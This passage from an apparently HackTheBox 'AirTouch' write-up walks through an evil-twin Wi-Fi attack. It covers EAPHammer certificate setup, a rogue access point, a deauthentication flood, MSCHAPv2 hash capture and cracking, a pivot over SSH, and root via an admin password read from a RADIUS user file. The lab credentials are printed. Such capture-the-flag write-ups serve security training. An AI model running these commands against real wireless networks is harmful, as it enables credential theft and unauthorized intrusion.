Bethesda game. &gt;:D</span><br><span class="line"></span><br><span class="line">                             Version:  1.14.0</span><br><span class="line">                            Codename:  Final Frontier</span><br><span class="line">                              Author:  @s0lst1c3</span><br><span class="line">                             Contact:  gabriel&lt;&lt;at&gt;&gt;transmitengage.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[?] Am I root?</span><br><span class="line">[*] Checking for rootness...</span><br><span class="line">[*] I AM ROOOOOOOOOOOOT</span><br><span class="line">[*] Root privs confirmed! 8D</span><br><span class="line">Case 1: Import all separate</span><br><span class="line">[CW] Ensuring server cert, CA cert, and private key are valid...</span><br><span class="line">server.crt</span><br><span class="line">server.key</span><br><span class="line">ca.crt</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Loading private key from server.key</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Loading server cert from server.crt</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Loading CA certificate chain from ca.crt</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Constructing full certificate chain with integrated key...</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Writing private key and full certificate chain to file...</span><br><span class="line">[CW] Complete!</span><br><span class="line">[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem</span><br><span class="line">[CW] Activating full certificate chain...</span><br><span class="line">[CW] Complete!</span><br><span class="line">root@AirTouch-Consultant:~#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# eaphammer/eaphammer   --cert-wizard list</span><br><span class="line"></span><br><span class="line">                     .__</span><br><span class="line">  ____ _____  ______ |  |__ _____    _____   _____   ___________</span><br><span class="line">_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \</span><br><span class="line">\  ___/ / __ \|  |_&gt; &gt;   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/</span><br><span class="line"> \___  &gt;____  /   __/|___|  (____  /__|_|  /__|_|  /\___  &gt;__|</span><br><span class="line">     \/     \/|__|        \/     \/      \/      \/     \/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        Now with more fast travel than a next-gen Bethesda game. &gt;:D</span><br><span class="line"></span><br><span class="line">                             Version:  1.14.0</span><br><span class="line">                            Codename:  Final Frontier</span><br><span class="line">                              Author:  @s0lst1c3</span><br><span class="line">                             Contact:  gabriel&lt;&lt;at&gt;&gt;transmitengage.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[?] Am I root?</span><br><span class="line">[*] Checking for rootness...</span><br><span class="line">[*] I AM ROOOOOOOOOOOOT</span><br><span class="line">[*] Root privs confirmed! 8D</span><br><span class="line">/root/eaphammer/certs/server/AirTouch CA.pem</span><br><span class="line"></span><br><span class="line">        Subject:                                            Issuer:</span><br><span class="line">        CN           -&gt; AirTouch CA                         CN           -&gt; AirTouch CA</span><br><span class="line">        C            -&gt; ES                                  C            -&gt; ES</span><br><span class="line">        ST           -&gt; None                                ST           -&gt; Madrid</span><br><span class="line">        L            -&gt; Madrid                              L            -&gt; Madrid</span><br><span class="line">        OU           -&gt; Server                              OU           -&gt; Certificate Authority</span><br><span class="line">        emailAddress -&gt; server@AirTouch.htb                 emailAddress -&gt; ca@AirTouch.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Setting-Up-the-Rogue-Infrastructure"><a href="#Setting-Up-the-Rogue-Infrastructure" class="headerlink" title="Setting Up the Rogue Infrastructure"></a>Setting Up the Rogue Infrastructure</h3><p>We dedicate <code>wlan4</code> for the deauth flood and <code>wlan3</code> for hosting the rogue AP, plus a small DHCP server so any associated client gets an IP from us.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">consultant@AirTouch-Consultant:~$ sudo iwconfig wlan4</span><br><span class="line">wlan4     IEEE 802.11  Mode:Monitor  Frequency:5.22 GHz  Tx-Power=20 dBm</span><br><span class="line">          Retry short limit:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:on</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">consultant@AirTouch-Consultant:~$ sudo ip addr add 192.168.99.1/24 dev wlan3</span><br><span class="line">consultant@AirTouch-Consultant:~$ sudo dnsmasq --interface=wlan3 --dhcp-range=192.168.99.50,192.168.99.150,12h --dhcp-option=3,192.168.99.1 --dhcp-option=6,8.8.8.8 -d</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We confirm the legitimate <code>AirTouch-Office</code> AP is up and on channel 44 (5 GHz).</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# airodump-ng wlan0</span><br><span class="line"></span><br><span class="line"> CH 13 ][ Elapsed: 48 s ][ 2026-01-21 05:14</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  -28      488       22    0   6   54        CCMP   PSK  AirTouch-Internet</span><br><span class="line"> 0E:62:E1:6B:CA:47  -28      488        0    0   6   54        CCMP   PSK  WIFI-JOHN</span><br><span class="line"> AC:8B:A9:AA:3F:D2  -28        2        0    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> (not associated)   28:6C:07:12:EE:A1  -29    0 - 1      0        2         AirTouch-Office</span><br><span class="line"> (not associated)   C8:8A:9A:6F:F9:D2  -29    0 - 1      0        3         AccessLink,AirTouch-Office</span><br><span class="line"> (not associated)   28:6C:07:12:EE:F3  -29    0 - 1      0        2         AirTouch-Office</span><br><span class="line"> F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29   54 - 1      0       23         AirTouch-Internet</span><br><span class="line">Quitting...</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Launching-the-Evil-Twin"><a href="#Launching-the-Evil-Twin" class="headerlink" title="Launching the Evil Twin"></a>Launching the Evil Twin</h3><p>We start EAPHammer impersonating the office AP on channel 44 with WPA2-EAP and KARMA enabled.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# sudo ./eaphammer/eaphammer     --bssid AC:8B:A9:AA:3F:D2     --essid AirTouch-Office     --channel 44     --interface wlan3     --auth wpa-eap     --creds     --karma     --debug</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we deauth the real AP so clients are forced to roam — and most of them will land on the rogue radio because our cert matches.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">consultant@AirTouch-Consultant:~$ sudo aireplay-ng --deauth 0 -a AC:8B:A9:F3:A1:13 wlan4</span><br><span class="line">05:23:16  Waiting for beacon frame (BSSID: AC:8B:A9:F3:A1:13) on channel 44</span><br><span class="line">NB: this attack is more effective when targeting</span><br><span class="line">a connected wireless client (-c &lt;client&#x27;s mac&gt;).</span><br><span class="line">05:23:16  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:16  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:17  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:17  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:18  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:18  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:19  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:19  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:20  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:20  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line">05:23:20  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>After a short wait, EAPHammer logs an MSCHAPv2 challenge&#x2F;response from a legitimate client.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">IEEE 802.1X: 28:6c:07:12:ee:f3 TX status - version=2 type=0 length=68 - ack=1</span><br><span class="line">wlan3: Event EAPOL_RX (23) received</span><br><span class="line">IEEE 802.1X: 113 bytes from 28:6c:07:12:ee:f3</span><br><span class="line">   IEEE 802.1X: version=1 type=0 length=109</span><br><span class="line">EAP: code=2 identifier=234 length=109</span><br><span class="line"> (response)</span><br><span class="line">wlan3: STA 28:6c:07:12:ee:f3 IEEE 802.1X: received EAP packet (code=2 id=234 len=109) from STA: EAP Response-PEAP (25)                                      </span><br><span class="line">IEEE 802.1X: 28:6c:07:12:ee:f3 BE_AUTH entering state RESPONSE</span><br><span class="line">EAP: EAP entering state RECEIVED</span><br><span class="line">EAP: parseEapResp: rxResp=1 rxInitiate=0 respId=234 respMethod=25 respVendor=0 respVendorMethod=0</span><br><span class="line">EAP: EAP entering state INTEGRITY_CHECK</span><br><span class="line">EAP: EAP entering state METHOD_RESPONSE</span><br><span class="line">SSL: Received packet(len=109) - Flags 0x01</span><br><span class="line">SSL: Received packet: Flags 0x1 Message Length 0</span><br><span class="line">EAP-PEAP: received 103 bytes encrypted data for Phase 2</span><br><span class="line">OpenSSL: RX ver=0x0 content_type=256 (TLS header info/)</span><br><span class="line">EAP-PEAP: Decrypted Phase 2 EAP - hexdump(len=74): 02 ea 00 4a 1a 02 ea 00 45 31 e3 f1 3c eb 1d 2d 72 2a 98 fd db fe f8 c6 32 f9 00 00 00 00 00 00 00 00 fd 34 97 4a 0e 32 dd ff a5 d4 96 18 04 af 18 13 88 70 6f b4 f2 a6 16 e4 00 41 69 72 54 6f 75 63 68 5c 72 34 75 6c 63 6c                                        </span><br><span class="line">EAP-PEAP: received Phase 2: code=2 identifier=234 length=74</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mschapv2: Wed Jan 21 05:24:47 2026</span><br><span class="line">         domain\username:               AirTouch\r4ulcl</span><br><span class="line">         username:                      r4ulcl</span><br><span class="line">         challenge:                     a6:8f:07:a3:ca:69:4d:ac</span><br><span class="line">         response:                      fd:34:97:4a:0e:32:dd:ff:a5:d4:96:18:04:af:18:13:88:70:6f:b4:f2:a6:16:e4</span><br><span class="line"></span><br><span class="line">         jtr NETNTLM:                   r4ulcl:$NETNTLM$a68f07a3ca694dac$fd34974a0e32ddffa5d4961804af181388706fb4f2a616e4                                   </span><br><span class="line"></span><br><span class="line">         hashcat NETNTLM:               r4ulcl::::fd34974a0e32ddffa5d4961804af181388706fb4f2a616e4:a68f07a3ca694dac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EAP-MSCHAPV2: Invalid NT-Response</span><br><span class="line">EAP: EAP entering state METHOD_REQUEST</span><br><span class="line">EAP: building EAP-Request: Identifier 235</span><br><span class="line">EAP-PEAP: Encrypting Phase 2 data - hexdump(len=66): 01 eb 00 42 1a 04 ea 00 3d 45 3d 36 39 31 20 52 3d 30 20 43 3d 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 20 56 3d 33 20 4d 3d 46 41 49 4c 45 44                                                              </span><br><span class="line">OpenSSL: TX ver=0x0 content_type=256 (TLS header info/)</span><br><span class="line">SSL: Generating Request</span><br><span class="line">SSL: Sending out 95 bytes (message sent completely)</span><br><span class="line">EAP: EAP entering state SEND_REQUEST</span><br><span class="line">EAP: EAP entering state IDLE</span><br><span class="line">EAP: retransmit timeout 3 seconds (from dynamic back off; retransCount=0)</span><br><span class="line">IEEE 802.1X: 28:6c:07:12:ee:f3 BE_AUTH entering state REQUEST</span><br><span class="line">wlan3: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Sending EAP Packet (identifier 235)</span><br><span class="line">wlan3: Event EAPOL_TX_STATUS (37) received</span><br><span class="line">IEEE 802.1X: 28:6c:07:12:ee:f3 TX status - version=2 type=0 length=101 - ack=1</span><br><span class="line">wlan3: Event EAPOL_RX (23) received</span><br><span class="line">IEEE 802.1X: 45 bytes from 28:6c:07:12:ee:f3</span><br><span class="line">   IEEE 802.1X: version=1 type=0 length=41</span><br><span class="line">EAP: code=2 identifier=235 length=41</span><br><span class="line"> (response)</span><br><span class="line">wlan3: STA 28:6c:07:12:ee:f3 IEEE 802.1X: received EAP packet (code=2 id=235 len=41) from STA: EAP Response-PEAP (25)                                       </span><br><span class="line">IEEE 802.1X: 28:6c:07:12:ee:f3 BE_AUTH entering state REQUEST</span><br></pre></td></tr></table></figure></div>
+
+<p>We grab the <code>hashcat NETNTLM</code> line:</p>
+<ul>
+<li><strong>User:</strong> <code>AirTouch\r4ulcl</code></li>
+<li><strong>Hash:</strong> <code>r4ulcl::::fd34974a0e32ddffa5d4961804af181388706fb4f2a616e4:a68f07a3ca694dac</code></li>
+</ul>
+<h2 id="Cracking-the-MSCHAPv2-Hash"><a href="#Cracking-the-MSCHAPv2-Hash" class="headerlink" title="Cracking the MSCHAPv2 Hash"></a>Cracking the MSCHAPv2 Hash</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &quot;r4ulcl::::fd34974a0e32ddffa5d4961804af181388706fb4f2a616e4:a68f07a3ca694dac&quot; &gt; ~/hash.txt</span><br><span class="line"></span><br><span class="line">$ john  -w:/usr/share/wordlists/rockyou.txt ~/hashCommand &#x27;wordlist&#x27; not found, did you mean:</span><br><span class="line">  command &#x27;wordlists&#x27; from deb wordlists</span><br><span class="line">Try: sudo apt install &lt;deb name&gt;</span><br><span class="line">johnjohn  -w:/usr/share/wordlists/rockyou.txt ~/hash.txt</span><br><span class="line">Warning: detected hash type &quot;netntlm&quot;, but the string is also recognized as &quot;netntlm-naive&quot;</span><br><span class="line">Use the &quot;--format=netntlm-naive&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support for this hash type, consider --fork=4</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">laboratory       (r4ulcl)</span><br><span class="line">1g 0:00:00:00 DONE (2026-01-21 00:32) 25.00g/s 2318Kp/s 2318Kc/s 2318KC/s ragde..ivan23</span><br><span class="line">Use the &quot;--show --format=netntlm&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><code>r4ulcl : laboratory</code>. Done.</p>
+<h2 id="Joining-AirTouch-Office"><a href="#Joining-AirTouch-Office" class="headerlink" title="Joining AirTouch-Office"></a>Joining AirTouch-Office</h2><p>We swap to a PEAP <code>wpa_supplicant</code> profile on <code>wlan1</code> and DHCP into the office network.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# cat office.conf</span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;AirTouch-Office&quot;</span><br><span class="line">    key_mgmt=WPA-EAP</span><br><span class="line">    eap=PEAP</span><br><span class="line">    identity=&quot;AirTouch\\r4ulcl&quot;</span><br><span class="line">    password=&quot;laboratory&quot;</span><br><span class="line">&#125;</span><br><span class="line">root@AirTouch-Consultant:~# wpa_supplicant -i wlan1 -c office.conf -B</span><br><span class="line">Successfully initialized wpa_supplicant</span><br><span class="line">rfkill: Cannot open RFKILL control device</span><br><span class="line">rfkill: Cannot get wiphy information</span><br><span class="line">nl80211: Could not set interface &#x27;p2p-dev-wlan1&#x27; UP</span><br><span class="line">nl80211: deinit ifname=p2p-dev-wlan1 disabled_11b_rates=0</span><br><span class="line">p2p-dev-wlan1: Failed to initialize driver interface</span><br><span class="line">P2P: Failed to enable P2P Device interface</span><br><span class="line">root@AirTouch-Consultant:~# dhclient wlan1</span><br><span class="line">root@AirTouch-Consultant:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0@if29: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 92:03:9b:e4:f1:fe brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: wlan0: &lt;BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.3.61/24 brd 192.168.3.255 scope global dynamic wlan0</span><br><span class="line">       valid_lft 86038sec preferred_lft 86038sec</span><br><span class="line">    inet6 fe80::ff:fe00:0/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: wlan1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.98/24 brd 10.10.10.255 scope global dynamic wlan1</span><br><span class="line">       valid_lft 863998sec preferred_lft 863998sec</span><br><span class="line">    inet6 fe80::ff:fe00:100/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">9: wlan2: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">10: wlan3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc mq state DOWN group default qlen 1000</span><br><span class="line">    link/ether ac:8b:a9:aa:3f:d2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.99.1/24 scope global wlan3</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">11: wlan4: &lt;BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UNKNOWN group default qlen 1000                                      </span><br><span class="line">    link/ieee802.11/radiotap 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">12: wlan5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">13: wlan6: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure></div>
+
+<p><code>wlan1</code> now has <code>10.10.10.98/24</code> — we are inside the office segment with the management AP at <code>10.10.10.1</code>. Time to use the credentials we lifted from <code>send_certs.sh</code>.</p>
+<h2 id="Pivot-remote-AirTouch-AP-MGT"><a href="#Pivot-remote-AirTouch-AP-MGT" class="headerlink" title="Pivot - remote@AirTouch-AP-MGT"></a>Pivot - remote@AirTouch-AP-MGT</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">remote@10.10.10.1&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">remote@AirTouch-AP-MGT:~$ id</span><br><span class="line">uid=1000(remote) gid=1000(remote) groups=1000(remote)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-Root"><a href="#Privilege-Escalation-Root" class="headerlink" title="Privilege Escalation - Root"></a>Privilege Escalation - Root</h2><p>We rummage through <code>/etc/hostapd</code> since this is the management AP, and the RADIUS user database for the office network sits right there with an <code>admin</code> user and password.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">remote@AirTouch-AP-MGT:/etc/hostapd$ cat * | grep -i admin</span><br><span class="line"># text file that could be used, e.g., to populate the AP administration UI with</span><br><span class="line"># administered bit)</span><br><span class="line">&quot;admin&quot;                                 MSCHAPV2                &quot;xMJpzXt4D9ouMuL3JJsMriF7KZozm7&quot; [2]</span><br><span class="line"># text file that could be used, e.g., to populate the AP administration UI with</span><br><span class="line"># administered bit)</span><br><span class="line">remote@AirTouch-AP-MGT:/etc/hostapd$</span><br></pre></td></tr></table></figure></div>
+
+<p>That same password works for the local <code>admin</code> account, and <code>admin</code> has unrestricted <code>sudo</code>.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">remote@AirTouch-AP-MGT:/etc/hostapd$ su admin</span><br><span class="line">Password:</span><br><span class="line">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="line">See &quot;man sudo_root&quot; for details.</span><br><span class="line"></span><br><span class="line">admin@AirTouch-AP-MGT:/etc/hostapd$ id</span><br><span class="line">uid=1001(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">admin@AirTouch-AP-MGT:/etc/hostapd$ sudo -l</span><br><span class="line">Matching Defaults entries for admin on AirTouch-AP-MGT:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User admin may run the following commands on AirTouch-AP-MGT:</span><br><span class="line">    (ALL) ALL</span><br><span 